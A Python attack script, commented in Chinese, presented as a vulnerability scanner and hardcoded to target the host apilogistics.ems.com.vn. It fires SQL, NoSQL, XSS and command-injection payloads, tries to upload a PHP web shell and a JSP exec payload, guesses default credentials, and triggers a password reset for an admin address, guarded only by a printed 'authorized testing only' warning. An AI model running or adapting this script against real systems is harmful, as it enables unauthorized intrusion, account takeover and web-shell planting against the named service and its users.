#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
EMS API 深度漏洞扫描器
全自动化安全测试工具
"""

import requests
import json
import time
import random
import string
from datetime import datetime
from typing import Dict, List, Tuple
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

# 禁用 SSL 警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class EMSVulnScanner:
    """EMS API 漏洞扫描器"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.api_base = f"{self.base_url}/api"
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        })
        
        self.results = {
            'scan_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'target': base_url,
            'vulnerabilities': [],
            'findings': {
                'critical': [],
                'high': [],
                'medium': [],
                'low': [],
                'info': []
            },
            'tested_endpoints': 0,
            'total_requests': 0
        }
        
        # 测试载荷
        self.sql_payloads = [
            "' OR '1'='1", "' OR 1=1--", "' OR 'a'='a", 
            "admin'--", "admin' #", "') OR ('1'='1",
            "1' UNION SELECT NULL--", "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055"
        ]
        
        self.nosql_payloads = [
            '{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}',
            '{"username":{"$ne":null},"password":{"$ne":null}}'
        ]
        
        self.xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src=x onerror=alert(1)>'
        ]
        
        self.command_injection = [
            '; ls -la', '| whoami', '`whoami`', '$(whoami)',
            '; cat /etc/passwd', '&& id'
        ]
    
    def log_vuln(self, severity: str, title: str, description: str, evidence: Dict):
        """记录漏洞"""
        vuln = {
            'severity': severity,
            'title': title,
            'description': description,
            'evidence': evidence,
            'timestamp': datetime.now().strftime('%H:%M:%S')
        }
        self.results['vulnerabilities'].append(vuln)
        self.results['findings'][severity.lower()].append(vuln)
        
        severity_emoji = {
            'CRITICAL': '🔴',
            'HIGH': '🟠', 
            'MEDIUM': '🟡',
            'LOW': '🟢',
            'INFO': 'ℹ️'
        }
        print(f"  {severity_emoji.get(severity, '•')} [{severity}] {title}")
    
    def test_endpoint(self, method: str, endpoint: str, data: Dict = None, 
                     headers: Dict = None) -> Tuple[int, Dict, str]:
        """测试单个端点"""
        url = f"{self.api_base}{endpoint}"
        self.results['total_requests'] += 1
        
        try:
            req_headers = self.session.headers.copy()
            if headers:
                req_headers.update(headers)
            
            if method.upper() == 'GET':
                resp = self.session.get(url, headers=req_headers, timeout=10)
            elif method.upper() == 'POST':
                resp = self.session.post(url, json=data, headers=req_headers, timeout=10)
            elif method.upper() == 'PUT':
                resp = self.session.put(url, json=data, headers=req_headers, timeout=10)
            elif method.upper() == 'DELETE':
                resp = self.session.delete(url, headers=req_headers, timeout=10)
            else:
                return 0, {}, ''
            
            try:
                resp_json = resp.json()
            except:
                resp_json = {}
            
            return resp.status_code, resp_json, resp.text
        except Exception as e:
            return 0, {}, str(e)
    
    def test_authentication_bypass(self):
        """测试认证绕过"""
        print("\n" + "="*60)
        print("[1] 测试认证绕过和未授权访问")
        print("="*60)
        
        sensitive_endpoints = [
            ('GET', '/customer/info'),
            ('GET', '/customer/order/list'),
            ('GET', '/driver/get-user'),
            ('GET', '/order/detail'),
            ('GET', '/order/list-license'),
            ('GET', '/shipment/detail'),
            ('GET', '/shipment/list'),
            ('GET', '/notification/list'),
        ]
        
        for method, endpoint in sensitive_endpoints:
            status, resp_json, resp_text = self.test_endpoint(method, endpoint)
            
            if status == 200:
                self.log_vuln(
                    'CRITICAL',
                    f'未授权访问 - {endpoint}',
                    f'{method} {endpoint} 无需认证即可访问',
                    {
                        'endpoint': endpoint,
                        'method': method,
                        'status_code': status,
                        'response': str(resp_json)[:200]
                    }
                )
            elif status in [401, 403]:
                print(f"  ✓ {method} {endpoint} - 需要认证")
            elif status == 404:
                print(f"  - {method} {endpoint} - 不存在")
            else:
                print(f"  ? {method} {endpoint} - 状态码: {status}")
        
        self.results['tested_endpoints'] += len(sensitive_endpoints)
    
    def test_sql_injection(self):
        """测试 SQL 注入"""
        print("\n" + "="*60)
        print("[2] 测试 SQL 注入漏洞")
        print("="*60)
        
        test_endpoints = [
            ('GET', '/order/detail', 'id'),
            ('GET', '/shipment/detail', 'id'),
            ('GET', '/customer/order/list', 'page'),
            ('POST', '/customer/login', 'username'),
        ]
        
        for method, endpoint, param in test_endpoints:
            for payload in self.sql_payloads[:3]:  # 测试前3个载荷
                if method == 'GET':
                    test_url = f"{endpoint}?{param}={payload}"
                    status, resp_json, resp_text = self.test_endpoint(method, test_url)
                else:
                    data = {param: payload, 'password': 'test'}
                    status, resp_json, resp_text = self.test_endpoint(method, endpoint, data)
                
                # 检测 SQL 错误
                sql_errors = [
                    'sql syntax', 'mysql', 'sqlite', 'postgresql', 'oracle',
                    'syntax error', 'unexpected', 'warning', 'error in your sql'
                ]
                
                resp_lower = resp_text.lower()
                if any(err in resp_lower for err in sql_errors):
                    self.log_vuln(
                        'HIGH',
                        f'可能的 SQL 注入 - {endpoint}',
                        f'参数 {param} 可能存在 SQL 注入',
                        {
                            'endpoint': endpoint,
                            'parameter': param,
                            'payload': payload,
                            'response': resp_text[:300]
                        }
                    )
                    break
                
                time.sleep(0.1)
        
        print(f"  ✓ 完成 SQL 注入测试")
    
    def test_idor(self):
        """测试 IDOR (越权访问)"""
        print("\n" + "="*60)
        print("[3] 测试 IDOR 越权访问")
        print("="*60)
        
        idor_endpoints = [
            '/order/detail',
            '/shipment/detail',
            '/customer/order/list'
        ]
        
        # 测试不同的 ID
        test_ids = [1, 2, 100, 999, 1000, -1, 0, '1a', 'abc']
        
        for endpoint in idor_endpoints:
            responses = {}
            
            for test_id in test_ids:
                url = f"{endpoint}?id={test_id}"
                status, resp_json, resp_text = self.test_endpoint('GET', url)
                
                if status == 200 and resp_json:
                    responses[test_id] = {
                        'status': status,
                        'data': resp_json
                    }
                
                time.sleep(0.1)
            
            # 分析结果
            if len(responses) > 1:
                self.log_vuln(
                    'HIGH',
                    f'IDOR 漏洞 - {endpoint}',
                    f'通过修改 ID 参数可访问不同对象，可能存在越权',
                    {
                        'endpoint': endpoint,
                        'tested_ids': list(responses.keys()),
                        'accessible_count': len(responses)
                    }
                )
            
        print(f"  ✓ 完成 IDOR 测试")
    
    def test_business_logic(self):
        """测试业务逻辑漏洞"""
        print("\n" + "="*60)
        print("[4] 测试业务逻辑漏洞")
        print("="*60)
        
        # 测试注册功能
        print("  [*] 测试用户注册...")
        test_user = f"test_{random.randint(1000, 9999)}"
        register_data = {
            'username': test_user,
            'password': 'Test123!',
            'email': f'{test_user}@test.com'
        }
        
        status, resp, _ = self.test_endpoint('POST', '/customer/register', register_data)
        
        if status == 201 or status == 200:
            self.log_vuln(
                'MEDIUM',
                '无限制用户注册',
                '注册功能无验证码或其他限制，可能被滥用',
                {
                    'endpoint': '/customer/register',
                    'test_user': test_user,
                    'status': status
                }
            )
            
            # 尝试登录
            print("  [*] 测试新注册用户登录...")
            login_data = {
                'username': test_user,
                'password': 'Test123!'
            }
            status, resp, _ = self.test_endpoint('POST', '/customer/login', login_data)
            
            if status == 200 and ('token' in str(resp).lower() or 'access' in str(resp).lower()):
                token = None
                for key in ['token', 'access_token', 'access', 'jwt']:
                    if key in resp:
                        token = resp[key]
                        break
                
                if token:
                    self.log_vuln(
                        'INFO',
                        '成功获取测试账号 Token',
                        f'注册并登录成功，获取到认证令牌',
                        {
                            'username': test_user,
                            'token': str(token)[:50] + '...'
                        }
                    )
                    # 保存 token 供后续测试
                    self.session.headers['Authorization'] = f'Bearer {token}'
        
        # 测试密码重置
        print("  [*] 测试密码重置功能...")
        reset_data = {
            'email': 'admin@ems.com.vn'
        }
        status, resp, _ = self.test_endpoint('POST', '/driver/reset-password', reset_data)
        
        if status in [200, 201]:
            self.log_vuln(
                'CRITICAL',
                '密码重置功能可被滥用',
                '密码重置无需验证，可能导致账户接管',
                {
                    'endpoint': '/driver/reset-password',
                    'response': str(resp)
                }
            )
        
        # 测试订单创建
        print("  [*] 测试订单创建...")
        order_data = {
            'product': 'Test Product',
            'quantity': -1,  # 负数测试
            'price': 0.01    # 极低价格
        }
        status, resp, _ = self.test_endpoint('POST', '/customer/order/create-single', order_data)
        
        if status in [200, 201]:
            self.log_vuln(
                'HIGH',
                '订单创建无业务逻辑验证',
                '可创建负数数量或极低价格订单',
                {
                    'endpoint': '/customer/order/create-single',
                    'malicious_data': order_data
                }
            )
        
        print(f"  ✓ 完成业务逻辑测试")
    
    def test_parameter_pollution(self):
        """测试参数污染"""
        print("\n" + "="*60)
        print("[5] 测试参数污染和篡改")
        print("="*60)
        
        test_cases = [
            # 数组注入
            ('/order/detail', {'id': [1, 2, 3]}),
            # 对象注入
            ('/order/detail', {'id': {'$ne': None}}),
            # 类型混淆
            ('/order/detail', {'id': 'true'}),
            ('/order/detail', {'id': 'null'}),
        ]
        
        for endpoint, params in test_cases:
            url = endpoint + '?' + '&'.join([f"{k}={v}" for k, v in params.items()])
            status, resp, text = self.test_endpoint('GET', url)
            
            if status == 200:
                self.log_vuln(
                    'MEDIUM',
                    f'参数类型验证不足 - {endpoint}',
                    f'接受非预期的参数类型',
                    {
                        'endpoint': endpoint,
                        'parameters': params,
                        'status': status
                    }
                )
        
        print(f"  ✓ 完成参数污染测试")
    
    def test_file_upload(self):
        """测试文件上传漏洞"""
        print("\n" + "="*60)
        print("[6] 测试文件上传漏洞")
        print("="*60)
        
        upload_endpoints = [
            '/order/upload-license',
            '/shipment/upload-license'
        ]
        
        # 恶意文件测试
        test_files = [
            ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('test.php.jpg', '<?php phpinfo(); ?>', 'image/jpeg'),
            ('test.jsp', '<% Runtime.getRuntime().exec("whoami"); %>', 'application/octet-stream'),
        ]
        
        for endpoint in upload_endpoints:
            for filename, content, mimetype in test_files:
                # 模拟文件上传
                files = {
                    'file': (filename, content, mimetype)
                }
                
                url = f"{self.api_base}{endpoint}"
                
                try:
                    resp = self.session.post(
                        url, 
                        files=files,
                        headers={'Accept': 'application/json'},
                        timeout=10
                    )
                    
                    self.results['total_requests'] += 1
                    
                    if resp.status_code in [200, 201]:
                        self.log_vuln(
                            'CRITICAL',
                            f'文件上传漏洞 - {endpoint}',
                            f'可上传 {filename}，可能导致代码执行',
                            {
                                'endpoint': endpoint,
                                'filename': filename,
                                'status': resp.status_code,
                                'response': resp.text[:200]
                            }
                        )
                except Exception as e:
                    pass
                
                time.sleep(0.2)
        
        print(f"  ✓ 完成文件上传测试")
    
    def test_rate_limiting(self):
        """测试速率限制"""
        print("\n" + "="*60)
        print("[7] 测试速率限制")
        print("="*60)
        
        # 快速发送多个请求
        endpoint = '/customer/login'
        data = {'username': 'test', 'password': 'test'}
        
        success_count = 0
        for i in range(50):
            status, _, _ = self.test_endpoint('POST', endpoint, data)
            if status != 429:  # 429 = Too Many Requests
                success_count += 1
        
        if success_count > 40:
            self.log_vuln(
                'MEDIUM',
                '缺少速率限制',
                f'登录接口无速率限制，可进行暴力破解',
                {
                    'endpoint': endpoint,
                    'requests_sent': 50,
                    'successful': success_count
                }
            )
        
        print(f"  ✓ 完成速率限制测试")
    
    def test_information_disclosure(self):
        """测试信息泄露"""
        print("\n" + "="*60)
        print("[8] 测试信息泄露")
        print("="*60)
        
        # 测试错误信息泄露
        test_endpoints = [
            '/customer/info?id=99999999',
            '/order/detail?id=abc',
            '/invalid/endpoint',
        ]
        
        for endpoint in test_endpoints:
            status, resp, text = self.test_endpoint('GET', endpoint)
            
            # 检查敏感信息泄露
            sensitive_info = [
                'traceback', 'stack trace', 'exception', '/home/', '/var/www',
                'mysql', 'postgresql', 'sqlite', 'database', 'query'
            ]
            
            text_lower = text.lower()
            found = [info for info in sensitive_info if info in text_lower]
            
            if found:
                self.log_vuln(
                    'LOW',
                    f'错误信息泄露 - {endpoint}',
                    f'错误响应中包含敏感信息: {", ".join(found)}',
                    {
                        'endpoint': endpoint,
                        'sensitive_info': found,
                        'response_snippet': text[:300]
                    }
                )
        
        print(f"  ✓ 完成信息泄露测试")
    
    def test_default_credentials(self):
        """测试默认凭据"""
        print("\n" + "="*60)
        print("[9] 测试默认/弱凭据")
        print("="*60)
        
        default_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('test', 'test'),
            ('user', 'user'),
            ('driver', 'driver'),
            ('ems', 'ems123'),
        ]
        
        endpoints = [
            '/customer/login',
            '/driver/login'
        ]
        
        for endpoint in endpoints:
            for username, password in default_creds:
                data = {'username': username, 'password': password}
                status, resp, _ = self.test_endpoint('POST', endpoint, data)
                
                if status == 200 and ('token' in str(resp).lower() or 'success' in str(resp).lower()):
                    self.log_vuln(
                        'CRITICAL',
                        f'默认凭据可用 - {endpoint}',
                        f'使用默认凭据 {username}:{password} 登录成功',
                        {
                            'endpoint': endpoint,
                            'username': username,
                            'password': password,
                            'response': str(resp)[:200]
                        }
                    )
                
                time.sleep(0.2)
        
        print(f"  ✓ 完成默认凭据测试")
    
    def export_results(self):
        """导出扫描结果"""
        print("\n" + "="*60)
        print("[*] 导出扫描结果")
        print("="*60)
        
        # JSON 报告
        filename_json = f"ems_vuln_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename_json, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, ensure_ascii=False, indent=2)
        print(f"  ✓ JSON 报告: {filename_json}")
        
        # 文本报告
        filename_txt = f"ems_vuln_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename_txt, 'w', encoding='utf-8') as f:
            f.write("="*70 + "\n")
            f.write("EMS API 深度漏洞扫描报告\n")
            f.write("="*70 + "\n")
            f.write(f"扫描时间: {self.results['scan_time']}\n")
            f.write(f"目标: {self.results['target']}\n")
            f.write(f"测试端点: {self.results['tested_endpoints']}\n")
            f.write(f"总请求数: {self.results['total_requests']}\n")
            f.write(f"发现漏洞: {len(self.results['vulnerabilities'])}\n")
            f.write("="*70 + "\n\n")
            
            # 按严重程度分类
            for severity in ['critical', 'high', 'medium', 'low', 'info']:
                vulns = self.results['findings'][severity]
                if vulns:
                    f.write(f"\n[{severity.upper()}] 漏洞 ({len(vulns)} 个)\n")
                    f.write("-"*70 + "\n")
                    for v in vulns:
                        f.write(f"\n标题: {v['title']}\n")
                        f.write(f"描述: {v['description']}\n")
                        f.write(f"证据: {json.dumps(v['evidence'], ensure_ascii=False, indent=2)}\n")
                        f.write("-"*70 + "\n")
        
        print(f"  ✓ 文本报告: {filename_txt}")
        
        return filename_json, filename_txt
    
    def print_summary(self):
        """打印扫描摘要"""
        print("\n" + "="*70)
        print("扫描摘要")
        print("="*70)
        print(f"目标: {self.results['target']}")
        print(f"扫描时间: {self.results['scan_time']}")
        print(f"测试端点: {self.results['tested_endpoints']}")
        print(f"总请求数: {self.results['total_requests']}")
        print(f"\n发现漏洞总数: {len(self.results['vulnerabilities'])}")
        print(f"  🔴 严重: {len(self.results['findings']['critical'])}")
        print(f"  🟠 高危: {len(self.results['findings']['high'])}")
        print(f"  🟡 中危: {len(self.results['findings']['medium'])}")
        print(f"  🟢 低危: {len(self.results['findings']['low'])}")
        print(f"  ℹ️  信息: {len(self.results['findings']['info'])}")
        print("="*70)
    
    def run_full_scan(self):
        """运行完整扫描"""
        print("\n" + "#"*70)
        print("# EMS API 深度漏洞扫描")
        print("# 目标: " + self.base_url)
        print("#"*70)
        
        try:
            self.test_authentication_bypass()
            time.sleep(1)
            
            self.test_default_credentials()
            time.sleep(1)
            
            self.test_business_logic()
            time.sleep(1)
            
            self.test_idor()
            time.sleep(1)
            
            self.test_sql_injection()
            time.sleep(1)
            
            self.test_parameter_pollution()
            time.sleep(1)
            
            self.test_file_upload()
            time.sleep(1)
            
            self.test_rate_limiting()
            time.sleep(1)
            
            self.test_information_disclosure()
            
            self.print_summary()
            self.export_results()
            
            print("\n" + "#"*70)
            print("# 扫描完成！")
            print("#"*70)
            
        except KeyboardInterrupt:
            print("\n\n[!] 扫描被用户中断")
            self.print_summary()
            self.export_results()
        except Exception as e:
            print(f"\n[!] 扫描出错: {str(e)}")
            import traceback
            traceback.print_exc()


def main():
    target = "https://apilogistics.ems.com.vn:8080"
    
    print("="*70)
    print("EMS API 深度漏洞扫描器")
    print("="*70)
    print(f"目标: {target}")
    print("\n[警告] 此工具仅用于授权的安全测试")
    print("请确保你有权限对目标进行安全测试\n")
    
    scanner = EMSVulnScanner(target)
    scanner.run_full_scan()


if __name__ == "__main__":
    main()
